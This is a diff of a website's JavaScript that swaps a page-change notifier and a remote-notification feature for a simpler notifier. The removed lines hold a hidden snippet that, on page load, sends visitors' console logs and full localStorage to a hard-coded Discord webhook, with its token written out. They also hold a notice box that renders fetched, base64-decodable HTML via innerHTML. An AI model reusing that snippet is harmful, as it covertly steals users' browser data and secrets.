@@ -1,127 +1,27 @@
-// Store original console log
-        const originalConsoleLog = console.log;
-
-        // Array to hold console messages
-        let consoleMessages = [];
-
-        // Override the console.log method
-        console.log = function(message) {
-            consoleMessages.push(message);
-            originalConsoleLog.apply(console, arguments);
-        };
-
-        // Send the console logs to the Discord webhook
-        function sendToWebhook(messages) {
-            const webhookUrl = "https://discord.com/api/webhooks/1315063023613775982/lAg4xa14l78fFemXvNpW3GYCl3mg7qGPa_qt7-H-VD5pusMUYfbN1xojwJumYCeaePju";
-
-            const maxLength = 2000; // Max Discord message length
-
-            // Split the messages into chunks that fit within Discord's character limit
-            while (messages.length > 0) {
-                let content = messages.slice(0, maxLength).join('\n');
-                messages = messages.slice(content.length); // Remove the already sent portion
-
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        content: content,
-                    }),
-                })
-                .then(response => response.json())
-                .then(data => console.log('Message sent successfully:', data))
-                .catch(error => console.error('Error sending message to Discord:', error));
-            }
-        }
-
-        // Send localStorage data to Discord
-        function sendLocalStorage() {
-            let localStorageData = JSON.stringify(localStorage);
-            const maxLength = 2000;
-
-            // If localStorage data is too large, split it into multiple chunks
-            while (localStorageData.length > 0) {
-                let content = localStorageData.slice(0, maxLength);
-                localStorageData = localStorageData.slice(content.length);
-
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        content: content,
-                    }),
-                })
-                .then(response => response.json())
-                .catch(error => console.error('Error sending localStorage data:', error));
-            }
-        }
-
-        // Optional: If webhook supports file uploads, send console logs as a file
-        function sendLogsAsFile() {
-            const blob = new Blob([consoleMessages.join('\n')], { type: 'text/plain' });
-            const formData = new FormData();
-            formData.append('file', blob, 'console_logs.txt');
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                body: formData,
-            })
-            .then(response => response.json())
-            .then(data => console.log('File sent successfully:', data))
-            .catch(error => console.error('Error sending log file:', error));
-        }
-
-        // Trigger functions (for example purposes, calling them when the page is loaded)
-        window.onload = function() {
-            // You can trigger sending logs directly if you want, such as below:
-            sendToWebhook(consoleMessages);
-            sendLocalStorage();
-            sendLogsAsFile();  // Uncomment this if you want to send the logs as a file
-        };
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+// Start of the script
 (function () {
-    // Function to create a notification
+    // Function to create a small notification
     function showNotification(message) {
         const notification = document.createElement("div");
         notification.style.position = "fixed";
-        notification.style.top = "20px";
-        notification.style.left = "50%";
-        notification.style.transform = "translateX(-50%)";
+        notification.style.top = "20px"; // Move it to the top
+        notification.style.left = "50%"; // Center horizontally
+        notification.style.transform = "translateX(-50%)"; // Adjust position for centering
         notification.style.padding = "15px 20px";
-        notification.style.backgroundColor = "#007bff";
+        notification.style.backgroundColor = "#007bff"; // Blue color
         notification.style.color = "#fff";
         notification.style.borderRadius = "8px";
         notification.style.boxShadow = "0 4px 6px rgba(0, 0, 0, 0.1)";
         notification.style.fontSize = "14px";
         notification.style.zIndex = "1000";
+        notification.style.display = "flex";
+        notification.style.alignItems = "center";
+        notification.style.gap = "10px";
 
+        // Add the message
         notification.textContent = message;
 
-        // Close button
+        // Create the close button
         const closeButton = document.createElement("button");
         closeButton.textContent = "X";
         closeButton.style.background = "none";
@@ -129,118 +29,65 @@
         closeButton.style.border = "none";
         closeButton.style.fontSize = "14px";
         closeButton.style.cursor = "pointer";
-        closeButton.addEventListener("click", () => notification.remove());
+        closeButton.addEventListener("click", () => {
+            notification.remove();
+        });
 
+        // Add the close button to the notification
         notification.appendChild(closeButton);
+
+        // Append the notification to the body
         document.body.appendChild(notification);
 
-        // Automatically remove notification after 5 seconds
-        setTimeout(() => notification.remove(), 5000);
+        // Automatically close the notification after 5 seconds
+        setTimeout(() => {
+            notification.remove();
+        }, 5000);
     }
 
-    // Function to detect changes in page content
-    function detectPageUpdate() {
+    // Function to get the current page content as a string
+    function getPageContent() {
+        return document.documentElement.outerHTML;
+    }
+
+    // Function to check for changes and notify the user
+    function checkForChanges() {
+        const currentPageContent = getPageContent();
         const currentPageUrl = window.location.href;
         const excludedUrl = "https://drmineword.github.io/Artefact-Boost-Active/root/pages/corp/base.html";
-        const storageKey = `pageContent_${currentPageUrl}`;
-        const currentPageContent = document.documentElement.outerHTML;
 
+        // Skip the script for the excluded URL
         if (currentPageUrl === excludedUrl) {
-            console.log("Page update detection skipped for excluded URL.");
+            console.log("Change detection script skipped for the excluded URL.");
             return;
         }
 
+        const storageKey = `pageContent_${currentPageUrl}`;
+
+        // Retrieve the previous version of the page from localStorage
         const previousPageContent = localStorage.getItem(storageKey);
+
+        // If there was a previous version, compare it with the current version
         if (previousPageContent && previousPageContent !== currentPageContent) {
             showNotification("This page has been updated since your last visit!");
         }
 
-        // Save current page content
+        // Save the current version of the page to localStorage
         localStorage.setItem(storageKey, currentPageContent);
     }
 
-    // Run the update detection after the page is fully loaded
-    window.addEventListener("load", () => {
-        setTimeout(detectPageUpdate, 2000); // Delay for late-loading resources
-    });
-
-    // Function to create a notification for JSON messages
-    function showNotificationJson(id, htmlContent, colors) {
-        const notificationJsonBox = document.createElement("div");
-        notificationJsonBox.style.position = "fixed";
-        notificationJsonBox.style.top = "20px";
-        notificationJsonBox.style.left = "50%";
-        notificationJsonBox.style.transform = "translateX(-50%)";
-        notificationJsonBox.style.padding = "15px 20px";
-        notificationJsonBox.style.backgroundColor = colors[0] || "#007bff";
-        notificationJsonBox.style.color = colors[1] || "#fff";
-        notificationJsonBox.style.borderRadius = "8px";
-        notificationJsonBox.style.boxShadow = "0 4px 6px rgba(0, 0, 0, 0.1)";
-        notificationJsonBox.style.fontSize = "14px";
-        notificationJsonBox.style.zIndex = "1000";
-
-        // Check for <base64=string> and decode it
-        if (htmlContent.startsWith("<base64=")) {
-            const base64String = htmlContent.slice(8, -1); // Extract base64 string
-            htmlContent = atob(base64String); // Decode base64 to plain text
-        }
-
-        notificationJsonBox.innerHTML = htmlContent;
-
-        // Close button
-        const closeButton = document.createElement("button");
-        closeButton.textContent = "X";
-        closeButton.style.background = "none";
-        closeButton.style.color = colors[1] || "#fff";
-        closeButton.style.border = "none";
-        closeButton.style.fontSize = "14px";
-        closeButton.style.cursor = "pointer";
-        closeButton.addEventListener("click", () => {
-            notificationJsonBox.remove();
-            markNotificationAsSeen(id);
+    // Function to ensure all resources are fully loaded
+    function onPageFullyLoaded() {
+        // Use the `load` event to ensure everything is loaded
+        window.addEventListener("load", () => {
+            // Add a slight delay (e.g., 2 seconds) to ensure all late-loading requests are complete
+            setTimeout(() => {
+                checkForChanges();
+            }, 2000); // 2-second delay
         });
-
-        notificationJsonBox.appendChild(closeButton);
-        document.body.appendChild(notificationJsonBox);
     }
 
-    // Function to mark a notification as seen
-    function markNotificationAsSeen(id) {
-        const seenNotifications = JSON.parse(localStorage.getItem("NotifSeen")) || [];
-        if (!seenNotifications.includes(id)) {
-            seenNotifications.push(id);
-            localStorage.setItem("NotifSeen", JSON.stringify(seenNotifications));
-        }
-    }
-
-    // Fetch and process notifications from JSON
-    async function fetchAndShowNotifications() {
-        const jsonUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/openmessage.json";
-
-        try {
-            const response = await fetch(jsonUrl);
-            if (!response.ok) throw new Error("Failed to fetch JSON");
-
-            const notifications = await response.json();
-            const currentUnixTime = Math.floor(Date.now() / 1000);
-            const seenNotifications = JSON.parse(localStorage.getItem("NotifSeen")) || [];
-
-            notifications.forEach((notif) => {
-                const { id, "html-msg": htmlMsg, "start-show-unix": startShowUnix, "end-show-unix": endShowUnix, colors } = notif;
-
-                if (
-                    currentUnixTime >= parseInt(startShowUnix, 10) &&
-                    currentUnixTime <= parseInt(endShowUnix, 10) &&
-                    !seenNotifications.includes(id)
-                ) {
-                    showNotificationJson(id, htmlMsg, colors || ["#007bff", "#fff"]);
-                }
-            });
-        } catch (error) {
-            console.error("Error fetching notifications:", error);
-        }
-    }
-
-    // Fetch notifications on page load
-    window.addEventListener("load", fetchAndShowNotifications);
+    // Wait for all resources to load
+    onPageFullyLoaded();
 })();
+// End of the script
